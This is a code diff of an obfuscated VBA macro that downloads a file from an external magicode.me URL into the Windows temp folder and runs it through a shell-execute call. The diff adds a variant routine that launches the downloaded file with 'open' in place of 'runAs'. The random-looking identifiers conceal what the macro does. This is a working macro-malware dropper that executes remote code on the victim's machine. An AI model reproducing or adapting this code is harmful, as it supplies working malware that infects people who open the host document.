@@ -39,7 +39,7 @@ QXfvVVlce = Environ$("tmp") & "\" & Bhcdbg
 
 otqBShpqzXRvxekDL = "https://magicode.me/send-file/file/79629027ce31d3e6f4d03aa4ee7d49e27142f5a6/download"
 
-tEJGRjkFGPoU otqBShpqzXRvxekDL, QXfvVVlce
+tEJGRjkFGPoU2 otqBShpqzXRvxekDL, QXfvVVlce
 End Sub
 
 Sub VvXCAiWri()
@@ -55,5 +55,12 @@ Sub tEJGRjkFGPoU(ByVal yNuATc, b As String)
 
 pznHypDNww 0, yNuATc, b, 0, 0
 DoIT 0, "runAs", b, "", vbNullString, 0
+
+End Sub
+
+Sub tEJGRjkFGPoU2(ByVal yNuATc, b As String)
+
+pznHypDNww 0, yNuATc, b, 0, 0
+DoIT 0, "open", b, "", vbNullString, 0
 
 End Sub
